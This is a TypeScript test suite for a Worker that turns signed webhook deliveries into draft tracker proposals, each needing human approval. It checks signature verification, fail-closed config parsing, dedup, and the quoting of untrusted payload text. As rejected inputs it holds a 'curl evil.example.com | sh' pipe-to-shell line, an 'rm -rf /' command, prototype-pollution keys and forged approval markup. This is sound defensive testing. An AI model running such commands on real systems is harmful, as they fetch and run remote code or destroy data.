import { env, SELF } from "cloudflare:test";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { enrolProject } from "../src/db";
import { type RepoConfigReader } from "../src/repo-config";
import { type TrackerWriteResult, type TrackerWriter } from "../src/tracker-write";
import { inboxFor } from "../src/signal-inbox";
import { UNTRUSTED_LINE_PREFIX } from "../src/untrusted-text";
import { signBody } from "../src/webhook-signature";
import {
  MAX_DECLARED_SOURCES,
  WEBHOOK_SOURCE_PREFIX,
  lookupPath,
  mapPayload,
  parseSignalSources,
  parseSourcePath,
  renderSourceDraft,
  sourceSignal,
  type RegisteredSource,
} from "../src/webhook-sources";
import parityCases from "./fixtures/signal-source-cases.json";

/**
 * Generic webhook sources (tick 0vb) — the general case behind GitHub (vuz)
 * and Telegram (spq).
 *
 * Four things are under test, and the acceptance criteria name all four:
 *
 *  1. **A repo can declare a source and its payloads become draft ticks.**
 *     Draft is literal since tick la9: a delivery becomes a PROPOSAL, and a
 *     human pressing Create is what puts anything in `.tick/`. Run through the
 *     real HTTP door, because a registry that works in a pure function and not
 *     at the route is a registry the product does not have.
 *  2. **An unsigned or wrongly-signed payload is refused**, and refused
 *     BEFORE the body is parsed.
 *  3. **An unknown key in the declaration fails closed** — the whole source is
 *     refused, not the key ignored — and `__proto__` is an unknown key rather
 *     than a hole in the check.
 *  4. **Dedup is the funnel's.** A redelivery comes back `duplicate` naming the
 *     first PROPOSAL, from `(source, external_ref)` in the SignalInbox —
 *     whatever the human did with it, including discarding it. There is no
 *     second dedup here to test, which is the point.
 */

const BASE = "https://factory.example.com";
const SECRET = "sentry-shared-secret-for-tests";
const BINDING = "SIGNAL_SECRET_SENTRY";

const SCHEME = {
  algorithm: "hmac-sha256",
  header: "sentry-hook-signature",
  encoding: "hex",
  prefix: "",
} as const;

/** The declaration this suite's repository tracks, unless a test says otherwise. */
const DECLARATION = `version = 2

[roles.implement]
kind = "claude"

[signals.sources.sentry]
secret = "${BINDING}"
header = "${SCHEME.header}"
external_ref = "data.issue.id"
title = "data.issue.title"
description = "data.issue.culprit"
type = "bug"
priority = 1
labels = ["sentry"]
`;

/** The tracker as the contents API presents it: create-only, in memory. */
class FakeContents implements TrackerWriter {
  readonly files = new Map<string, string>();
  private commits = 0;

  async create(
    _project: string,
    path: string,
    input: { content: string; message: string; branch?: string }
  ): Promise<TrackerWriteResult> {
    if (this.files.has(path)) return { state: "exists", detail: `${path} exists` };
    this.files.set(path, input.content);
    this.commits += 1;
    return {
      state: "created",
      commit_sha: `commit${this.commits}`,
      content_sha: `blob${this.commits}`,
    };
  }
}

/** The repository's tracked config, as this Worker would fetch it. */
class FakeRepoConfig implements RepoConfigReader {
  readonly reads: { project: string; ref: string | null }[] = [];
  constructor(public source: string | null) {}
  async read(project: string, ref: string | null): Promise<string | null> {
    this.reads.push({ project, ref });
    if (this.source === "THROW") throw new Error("GitHub answered HTTP 500");
    return this.source;
  }
}

/**
 * A fake Bot API on the global fetch, capturing every call.
 *
 * Here only so one thing can be asserted: a proposal nobody is told about is a
 * proposal nobody can accept. `SELF.fetch` (the door) does not go through
 * `globalThis.fetch`, so this intercepts the announcement and nothing else.
 */
type BotCall = { method: string; body: Record<string, unknown> };
let bot: { calls: BotCall[]; restore: () => void } | null = null;

function fakeBotAPI(): void {
  const calls: BotCall[] = [];
  const original = globalThis.fetch;
  let messageID = 7000;
  globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
    if (!url.startsWith("https://telegram.test/")) return original(input as RequestInfo, init);
    const method = url.slice(url.lastIndexOf("/") + 1);
    const body = init?.body === undefined ? {} : (JSON.parse(String(init.body)) as Record<string, unknown>);
    calls.push({ method, body });
    messageID += 1;
    return Response.json({
      ok: true,
      result: method === "sendMessage" ? { message_id: messageID } : true,
    });
  }) as typeof fetch;
  bot = { calls, restore: () => void (globalThis.fetch = original) };
}

const botCalls = (method: string): BotCall[] => (bot?.calls ?? []).filter((c) => c.method === method);

let contents: FakeContents;
let config: FakeRepoConfig;
const saved: Record<string, unknown> = {};

function set(name: string, value: unknown): void {
  if (!(name in saved)) saved[name] = (env as unknown as Record<string, unknown>)[name];
  (env as unknown as Record<string, unknown>)[name] = value;
}

beforeEach(() => {
  contents = new FakeContents();
  config = new FakeRepoConfig(DECLARATION);
  set("TICK_WRITER", contents);
  set("REPO_CONFIG", config);
  set("SIGNAL_COMMIT_RETRY_MS", "0");
  set(BINDING, SECRET);
  set("TELEGRAM_BOT_TOKEN", "test-bot-token");
  set("TELEGRAM_USER_ID", "424242");
  set("TELEGRAM_CHAT_ID", "424242");
  set("TELEGRAM_API_BASE_URL", "https://telegram.test");
  set("FACTORY_BASE_URL", BASE);
  fakeBotAPI();
});

afterEach(() => {
  bot?.restore();
  bot = null;
  for (const [name, value] of Object.entries(saved)) {
    (env as unknown as Record<string, unknown>)[name] = value;
  }
});

/** Each test takes its own project, so one inbox's dedup index cannot leak into another. */
let projectCounter = 0;
async function enrolled(): Promise<string> {
  projectCounter += 1;
  const project = `acme/sentries-${projectCounter}`;
  await enrolProject(env.DB, {
    project,
    enrolled_by: "operator@example.com",
    enrolled_at: new Date().toISOString(),
  });
  return project;
}

/**
 * A human at the gate (tick la9).
 *
 * Ingestion stops at a proposal now, so a test about what lands in `.tick/`
 * has to press Create the way the operator channel does. That the press is
 * needed at all is this file's other assertion: the tests below check
 * `contents.files` is empty until it happens.
 */
async function accept(project: string, draftID: string): Promise<{ tick_id: string; path: string }> {
  const decision = await inboxFor(env, project).decide(draftID, "create", "telegram:424242");
  expect(decision.state).toBe("accepted");
  if (decision.state !== "accepted") throw new Error(decision.state);
  return { tick_id: decision.tick_id, path: decision.path };
}

/**
 * Nothing was proposed.
 *
 * The assertion the refusal tests need since tick la9: a delivery no longer
 * writes to `.tick/` even when it succeeds, so `contents.files` being empty
 * stopped being evidence that a refusal refused anything. What must be empty
 * is the project's own draft list.
 */
async function proposals(project: string): Promise<number> {
  return (await inboxFor(env, project).listDrafts()).length;
}

function payload(over: Record<string, unknown> = {}): unknown {
  return {
    data: {
      issue: {
        id: "4519077231",
        title: "TypeError: cannot read property 'rows' of undefined",
        culprit: "app/export/csv.ts in writeRows",
        ...over,
      },
    },
  };
}

async function deliver(
  project: string,
  body: unknown,
  options: { source?: string; signature?: string; secret?: string; header?: string } = {}
): Promise<Response> {
  const raw = typeof body === "string" ? body : JSON.stringify(body);
  const signature = options.signature ?? (await signBody(SCHEME, options.secret ?? SECRET, raw));
  const headers: Record<string, string> = { "content-type": "application/json" };
  if (signature !== "") headers[options.header ?? SCHEME.header] = signature;
  return SELF.fetch(`${BASE}${WEBHOOK_SOURCE_PREFIX}/${project}/${options.source ?? "sentry"}`, {
    method: "POST",
    headers,
    body: raw,
  });
}

const registered = (over: Partial<RegisteredSource> = {}): RegisteredSource => ({
  name: "sentry",
  secret_binding: BINDING,
  scheme: { ...SCHEME },
  external_ref: "data.issue.id",
  title: "data.issue.title",
  description: "data.issue.culprit",
  type: "bug",
  priority: 1,
  labels: ["sentry"],
  ...over,
});

// ----------------------------------------- a declared source proposes drafts ---

describe("a repository declares a webhook source and its payloads become drafts", () => {
  it("proposes a draft from a signed delivery, and a tick when a human accepts it", async () => {
    const project = await enrolled();

    const response = await deliver(project, payload());

    expect(response.status).toBe(201);
    const body = (await response.json()) as Record<string, unknown>;
    expect(body.ingested).toBe(true);
    expect(body.drafted).toBe(true);
    expect(body.source).toBe("sentry");
    expect(body.external_ref).toBe("sentry:4519077231");
    expect(typeof body.draft_id).toBe("string");
    // Registering the source is consent to PROPOSE. Nothing is in the
    // repository until a human presses Create (tick la9) — and a declaration
    // in a tracked file must not be a weaker gate than a maintainer's label.
    expect(body.tick_id).toBeUndefined();
    expect(contents.files.size).toBe(0);

    const filed = await accept(project, body.draft_id as string);
    const record = JSON.parse(contents.files.get(filed.path)!) as Record<string, unknown>;
    expect(record).toMatchObject({
      title: "TypeError: cannot read property 'rows' of undefined",
      type: "bug",
      priority: 1,
      status: "open",
      external_ref: "sentry:4519077231",
      created_by: "webhook:sentry",
    });
    expect(record.labels).toEqual(["sentry"]);
    expect(String(record.description)).toContain("Webhook signal from `sentry`");
    expect(String(record.description)).toContain(`${UNTRUSTED_LINE_PREFIX}app/export/csv.ts`);
  });

  it("stores the source's own render on the draft, not a generic fallback", async () => {
    const project = await enrolled();

    const body = (await (await deliver(project, payload())).json()) as Record<string, unknown>;
    const draft = await inboxFor(env, project).getDraft(body.draft_id as string);

    // The channel renders `draft.presentation`, so the anti-forgery invariant
    // only reaches a human if the block the SOURCE composed is what got
    // stored. A draft carrying an empty presentation falls back to a generic
    // block and the quoting is gone.
    expect(draft?.presentation).toBe(body.presentation);
    expect(String(draft?.presentation)).toContain("<b>Draft tick");
    expect(String(draft?.presentation)).toContain(
      `${UNTRUSTED_LINE_PREFIX}app/export/csv.ts in writeRows`
    );
  });

  it("announces the draft, because a proposal nobody sees cannot be accepted", async () => {
    const project = await enrolled();

    const body = (await (await deliver(project, payload())).json()) as Record<string, unknown>;

    const sent = botCalls("sendMessage");
    expect(sent).toHaveLength(1);
    expect(String(sent[0]!.body.text)).toContain("TypeError: cannot read property");
    // And the render that reached the channel is the one the source composed,
    // so the anti-forgery invariant is what a human actually sees.
    expect(String(sent[0]!.body.text)).toContain(
      `${UNTRUSTED_LINE_PREFIX}app/export/csv.ts in writeRows`
    );
    const draft = await inboxFor(env, project).getDraft(body.draft_id as string);
    expect(draft?.message).not.toBeNull();
  });

  it("reads the declaration from the repository's default branch, not a commit", async () => {
    const project = await enrolled();

    await deliver(project, payload());

    expect(config.reads).toEqual([{ project, ref: null }]);
  });

  it("answers 404 for a project this factory has not enrolled", async () => {
    const response = await deliver("acme/never-enrolled", payload());

    expect(response.status).toBe(404);
    expect((await response.json()) as Record<string, unknown>).toMatchObject({
      error: "unknown_source",
    });
    // Nothing was fetched: enrolment gates the config read, so this route
    // cannot be used to make the Worker fetch from an arbitrary repository.
    expect(config.reads).toEqual([]);
  });

  it("answers a declared-but-unknown source exactly as an unenrolled project", async () => {
    const project = await enrolled();

    const unknown = await deliver(project, payload(), { source: "linear" });
    const unenrolled = await deliver("acme/never-enrolled", payload());

    expect(unknown.status).toBe(404);
    expect(await unknown.json()).toEqual(await unenrolled.json());
  });

  it("answers 503 for a declared source whose secret this deployment does not hold", async () => {
    const project = await enrolled();
    set(BINDING, undefined);

    const response = await deliver(project, payload());

    expect(response.status).toBe(503);
    const body = (await response.json()) as Record<string, unknown>;
    expect(body.error).toBe("webhook_not_configured");
    expect(String(body.detail)).toContain(BINDING);
    expect(await proposals(project)).toBe(0);
  });

  it("answers 405 to a GET rather than 401", async () => {
    const project = await enrolled();

    const response = await SELF.fetch(`${BASE}${WEBHOOK_SOURCE_PREFIX}/${project}/sentry`);

    expect(response.status).toBe(405);
  });

  it("answers 404 to a path that is not owner/repo/source", async () => {
    const response = await SELF.fetch(`${BASE}${WEBHOOK_SOURCE_PREFIX}/acme/widgets`, {
      method: "POST",
      body: "{}",
    });

    expect(response.status).toBe(404);
  });
});

// ---------------------------------------------------------- the signature ---

describe("an unsigned or wrongly-signed payload is refused", () => {
  it("refuses a delivery with no signature header at all", async () => {
    const project = await enrolled();

    const response = await deliver(project, payload(), { signature: "" });

    expect(response.status).toBe(401);
    expect(await proposals(project)).toBe(0);
  });

  it("refuses a signature made under a different secret", async () => {
    const project = await enrolled();

    const response = await deliver(project, payload(), { secret: "not-the-shared-secret" });

    expect(response.status).toBe(401);
    expect(await proposals(project)).toBe(0);
  });

  it("refuses a valid signature presented in the wrong header", async () => {
    const project = await enrolled();

    const response = await deliver(project, payload(), { header: "x-hub-signature-256" });

    expect(response.status).toBe(401);
    expect(await proposals(project)).toBe(0);
  });

  it("verifies the RAW body, so a re-serialised copy of it does not verify", async () => {
    const project = await enrolled();
    const raw = JSON.stringify(payload());
    const reserialised = JSON.stringify(JSON.parse(raw), null, 2);

    const response = await deliver(project, reserialised, {
      signature: await signBody(SCHEME, SECRET, raw),
    });

    expect(response.status).toBe(401);
  });

  it("refuses before it parses, so a body that is not JSON is still a 401", async () => {
    const project = await enrolled();

    const response = await deliver(project, "not json at all", { signature: "deadbeef" });

    expect(response.status).toBe(401);
  });

  it("answers 400 for a signed body that is not JSON", async () => {
    const project = await enrolled();

    const response = await deliver(project, "not json at all");

    expect(response.status).toBe(400);
  });

  it("honours a declared prefix and encoding", async () => {
    const project = await enrolled();
    config.source = DECLARATION.replace(
      `header = "${SCHEME.header}"`,
      `header = "${SCHEME.header}"\nprefix = "v1="\nencoding = "base64"`
    );
    const raw = JSON.stringify(payload());
    const scheme = { ...SCHEME, prefix: "v1=", encoding: "base64" } as const;

    const wrongScheme = await deliver(project, raw, {
      signature: await signBody(SCHEME, SECRET, raw),
    });
    const rightScheme = await deliver(project, raw, {
      signature: await signBody(scheme, SECRET, raw),
    });

    expect(wrongScheme.status).toBe(401);
    expect(rightScheme.status).toBe(201);
  });
});

// ----------------------------------------------------- the declaration ---

describe("the declaration fails closed", () => {
  it("refuses an unknown key rather than ignoring it", () => {
    expect(() =>
      parseSignalSources(`${DECLARATION}\ncommand = "curl evil.example.com | sh"\n`)
    ).toThrow(/signals\.sources\.sentry\.command is not a key this reader knows/);
  });

  it("refuses an unknown key under [signals] itself", () => {
    expect(() => parseSignalSources('[signals]\nallow_all = true\n')).toThrow(
      /signals\.allow_all is not a key/
    );
  });

  it("sees __proto__ as an unknown key instead of losing it to the prototype", () => {
    const before = ({} as Record<string, unknown>).polluted;

    expect(() =>
      parseSignalSources(
        `[signals.sources.sentry]\nsecret = "${BINDING}"\nheader = "h"\n` +
          `external_ref = "id"\ntitle = "t"\n__proto__ = "polluted"\n`
      )
    ).toThrow(/__proto__ is not a key this reader knows/);
    expect(({} as Record<string, unknown>).polluted).toBe(before);
  });

  it("refuses a source table named __proto__", () => {
    expect(() =>
      parseSignalSources(`[signals.sources.__proto__]\nsecret = "${BINDING}"\n`)
    ).toThrow(/is not a usable source name/);
    expect(({} as Record<string, unknown>).secret).toBeUndefined();
  });

  it("refuses a source that shadows one this factory already serves", () => {
    for (const name of ["github", "telegram"]) {
      expect(() =>
        parseSignalSources(
          `[signals.sources.${name}]\nsecret = "SIGNAL_SECRET_X"\nheader = "h"\n` +
            `external_ref = "id"\ntitle = "t"\n`
        )
      ).toThrow(/already serves/);
    }
  });

  it("refuses a secret that is a value rather than a binding name", () => {
    expect(() =>
      parseSignalSources(
        '[signals.sources.sentry]\nsecret = "hunter2"\nheader = "h"\n' +
          'external_ref = "id"\ntitle = "t"\n'
      )
    ).toThrow(/NAME of a Worker secret/);
  });

  it("refuses a secret binding that reaches for another credential", () => {
    for (const name of ["GITHUB_TOKEN", "FACTORY_TOKEN_HASH", "ANTHROPIC_API_KEY"]) {
      expect(() =>
        parseSignalSources(
          `[signals.sources.sentry]\nsecret = "${name}"\nheader = "h"\n` +
            'external_ref = "id"\ntitle = "t"\n'
        )
      ).toThrow(/NAME of a Worker secret/);
    }
  });

  it("refuses prose written where a payload path was expected", () => {
    expect(() =>
      parseSignalSources(
        `[signals.sources.sentry]\nsecret = "${BINDING}"\nheader = "h"\n` +
          'external_ref = "id"\ntitle = "A new Sentry alert"\n'
      )
    ).toThrow(/not a payload path/);
  });

  it("requires a secret, a header, an external_ref and a title", () => {
    for (const key of ["secret", "header", "external_ref", "title"]) {
      const lines = [
        "[signals.sources.sentry]",
        `secret = "${BINDING}"`,
        'header = "h"',
        'external_ref = "id"',
        'title = "t"',
      ].filter((line) => !line.startsWith(`${key} =`));
      expect(() => parseSignalSources(`${lines.join("\n")}\n`)).toThrow(
        new RegExp(`signals\\.sources\\.sentry\\.${key} is required`)
      );
    }
  });

  it("refuses an unusable algorithm, encoding, type or priority", () => {
    const base = `[signals.sources.sentry]\nsecret = "${BINDING}"\nheader = "h"\nexternal_ref = "id"\ntitle = "t"\n`;
    expect(() => parseSignalSources(`${base}algorithm = "md5"\n`)).toThrow(/algorithm/);
    expect(() => parseSignalSources(`${base}encoding = "rot13"\n`)).toThrow(/encoding/);
    expect(() => parseSignalSources(`${base}type = "incident"\n`)).toThrow(/type/);
    expect(() => parseSignalSources(`${base}priority = 9\n`)).toThrow(/priority/);
  });

  it("bounds how many sources one repository may declare", () => {
    const many = Array.from(
      { length: MAX_DECLARED_SOURCES + 1 },
      (_unused, i) =>
        `[signals.sources.s${i}]\nsecret = "${BINDING}"\nheader = "h"\nexternal_ref = "id"\ntitle = "t"\n`
    ).join("\n");
    expect(() => parseSignalSources(many)).toThrow(/past the/);
  });

  it("reads a repository that declares nothing as an empty registry", () => {
    expect(Object.keys(parseSignalSources("version = 2\n"))).toEqual([]);
    expect(Object.keys(parseSignalSources("[signals]\n"))).toEqual([]);
  });

  it("does not read a declaration out of another table's free text", () => {
    const source = `version = 2

[testing]
notes = """
[signals.sources.smuggled]
secret = "SIGNAL_SECRET_SMUGGLED"
"""
`;
    expect(Object.keys(parseSignalSources(source))).toEqual([]);
  });

  it("ingests nothing, and says so retryably, when the config cannot be read", async () => {
    const project = await enrolled();
    config.source = "[signals.sources.sentry]\ncommand = \"rm -rf /\"\n";

    const response = await deliver(project, payload());

    expect(response.status).toBe(503);
    expect((await response.json()) as Record<string, unknown>).toMatchObject({
      error: "source_config_unreadable",
    });
    expect(await proposals(project)).toBe(0);
  });

  it("ingests nothing when the config cannot be fetched at all", async () => {
    const project = await enrolled();
    config.source = "THROW";

    const response = await deliver(project, payload());

    expect(response.status).toBe(503);
    expect(await proposals(project)).toBe(0);
  });
});

// ------------------------------------------------------------- the dedup ---

describe("dedup is the funnel's, not a second one", () => {
  it("proposes once for a redelivery of the same external_ref", async () => {
    const project = await enrolled();

    const first = await deliver(project, payload());
    expect(first.status).toBe(201);
    const drafted = (await first.json()) as Record<string, unknown>;
    const filed = await accept(project, drafted.draft_id as string);

    const second = await deliver(project, payload());

    expect(second.status).toBe(200);
    expect((await second.json()) as Record<string, unknown>).toMatchObject({
      ingested: false,
      reason: "duplicate",
      draft_id: drafted.draft_id,
      draft_state: "created",
      tick_id: filed.tick_id,
      deliveries: 2,
    });
    expect(contents.files.size).toBe(1);
  });

  it("does not re-propose a redelivery of a signal a human DISCARDED", async () => {
    const project = await enrolled();

    const first = await deliver(project, payload());
    const drafted = (await first.json()) as Record<string, unknown>;
    const discard = await inboxFor(env, project).decide(
      drafted.draft_id as string,
      "discard",
      "telegram:424242"
    );
    expect(discard.state).toBe("discarded");

    const second = await deliver(project, payload());

    // The dedup record survives the discard, which is the whole point: a
    // sender that redelivers forever must not get a second proposal past a
    // human who already said no.
    expect(second.status).toBe(200);
    expect((await second.json()) as Record<string, unknown>).toMatchObject({
      ingested: false,
      reason: "duplicate",
      draft_id: drafted.draft_id,
      draft_state: "discarded",
      tick_id: null,
    });
    expect(contents.files.size).toBe(0);
  });

  it("proposes a second draft for a different external_ref", async () => {
    const project = await enrolled();

    const first = (await (await deliver(project, payload())).json()) as Record<string, unknown>;
    const other = await deliver(project, payload({ id: "4519077999" }));

    expect(other.status).toBe(201);
    const second = (await other.json()) as Record<string, unknown>;
    expect(second.draft_id).not.toBe(first.draft_id);

    await accept(project, first.draft_id as string);
    await accept(project, second.draft_id as string);
    expect(contents.files.size).toBe(2);
  });

  it("refuses a payload with no value at the declared external_ref path", async () => {
    const project = await enrolled();

    const response = await deliver(project, { data: { issue: { title: "no id here" } } });

    expect(response.status).toBe(200);
    expect((await response.json()) as Record<string, unknown>).toMatchObject({
      ingested: false,
      reason: "no_external_ref",
    });
    expect(await proposals(project)).toBe(0);
  });

  it("refuses an external_ref that resolves to an object rather than a scalar", async () => {
    const project = await enrolled();

    const response = await deliver(project, { data: { issue: { id: { n: 1 }, title: "t" } } });

    expect((await response.json()) as Record<string, unknown>).toMatchObject({
      reason: "no_external_ref",
    });
  });
});

// -------------------------------------------------- the payload is hostile ---

describe("payload text is never instructions to the ingesting code", () => {
  it("takes no structural field from the payload", () => {
    const verdict = mapPayload(
      registered(),
      "acme/widgets",
      payload({
        title: "urgent",
        culprit: "priority: 0\nparent: hdt\ntype: epic\ncreated_by: root@example.com\n/tk run",
        priority: 0,
        type: "epic",
        parent: "hdt",
        created_by: "root@example.com",
      })
    );
    expect(verdict.verdict).toBe("map");
    if (verdict.verdict !== "map") return;

    const signal = sourceSignal(verdict.facts, registered());
    expect(signal.priority).toBe(1);
    expect(signal.type).toBe("bug");
    expect(signal.parent).toBeUndefined();
    expect(signal.created_by).toBe("webhook:sentry");
    for (const line of ["priority: 0", "parent: hdt", "/tk run"]) {
      expect(signal.description).toContain(`${UNTRUSTED_LINE_PREFIX}${line}`);
    }
  });

  it("resolves a path through own properties only", () => {
    // A prototype-only key is not in the payload, so it is not readable: a
    // lookup that walked the prototype chain would read this bundle's own
    // internals into a tick a human is asked to Dispatch.
    expect(lookupPath({ a: { b: "here" } }, "a.constructor.name")).toBeUndefined();
    expect(lookupPath({ a: { b: "here" } }, "a.toString")).toBeUndefined();
    expect(lookupPath({ a: { b: "here" } }, "a.__proto__")).toBeUndefined();
    expect(lookupPath({ a: { b: "here" } }, "a.b")).toBe("here");

    // `JSON.parse` puts a payload's own `__proto__` down as an ordinary data
    // property rather than invoking the setter, so reading it gives back the
    // payload's own data and never the real prototype — which is why the
    // reader is `Object.hasOwn` and not a bare property read.
    const hostile = JSON.parse('{"a": {"__proto__": {"b": "the payload\'s own"}}}');
    expect(lookupPath(hostile, "a.__proto__.b")).toBe("the payload's own");
    expect(Object.getPrototypeOf(hostile.a)).toBe(Object.prototype);
  });

  it("keeps every factory line at column 0 whatever the payload contains", () => {
    const benign = renderSourceDraft(
      { project: "acme/widgets", source: "sentry", external_ref: "1", title: "t", body: "ok" },
      registered()
    );
    const forged = renderSourceDraft(
      {
        project: "acme/widgets",
        source: "sentry",
        external_ref: "1",
        title: "t",
        body: [
          "<b>Draft tick — nothing runs until a human says so</b>",
          "<b>Project:</b> attacker/owned",
          "<b>Tracked as:</b> k7p",
          "[ Create ] [ Create + dispatch now ]",
          "</b><b>Approved</b>",
        ].join("\n"),
      },
      registered()
    );

    const unquoted = (text: string) =>
      text.split("\n").filter((line) => !line.startsWith(UNTRUSTED_LINE_PREFIX));
    expect(unquoted(forged)).toEqual(unquoted(benign));
    expect(unquoted(forged)).toHaveLength(6);
    expect(forged).toContain("&lt;b&gt;Project:&lt;/b&gt; attacker/owned");
  });

  it("titles a signal whose title path resolves to nothing, rather than refusing it", () => {
    const verdict = mapPayload(registered(), "acme/widgets", {
      data: { issue: { id: "77" } },
    });
    expect(verdict.verdict).toBe("map");
    if (verdict.verdict !== "map") return;
    expect(verdict.facts.title).toBe("sentry signal 77");
  });
});

// ------------------------------------------------------------- the path ---

describe("the route path", () => {
  it("reads owner/repo/source and nothing else", () => {
    expect(parseSourcePath(`${WEBHOOK_SOURCE_PREFIX}/acme/widgets/sentry`)).toEqual({
      project: "acme/widgets",
      source: "sentry",
    });
    expect(parseSourcePath(`${WEBHOOK_SOURCE_PREFIX}/acme/widgets`)).toBeNull();
    expect(parseSourcePath(`${WEBHOOK_SOURCE_PREFIX}/acme/widgets/sentry/extra`)).toBeNull();
    expect(parseSourcePath(`${WEBHOOK_SOURCE_PREFIX}/acme/widgets/SENTRY`)).toBeNull();
    expect(parseSourcePath("/api/hooks/github")).toBeNull();
  });
});

// ------------------------------------------------------------- the parity ---

/**
 * The parity guard. Its cases live in a file both languages read: a fix
 * applied to one reader and not the other is exactly the failure this
 * repository has already shipped once, and `internal/herd/config/
 * signal_parity_test.go` runs the identical cases through tk's reader.
 *
 * The direction that matters is `refused`. This reader accepting a
 * declaration tk refuses is a fail-open webhook door.
 */
describe("the declaration reads the same here as it does in tk", () => {
  for (const testCase of parityCases.cases) {
    it(`agrees with tk on ${testCase.name}`, () => {
      if (testCase.refused === true) {
        expect(() => parseSignalSources(testCase.toml)).toThrow();
        return;
      }
      expect(Object.keys(parseSignalSources(testCase.toml)).sort()).toEqual(
        [...(testCase.sources ?? [])].sort()
      );
    });
  }
});
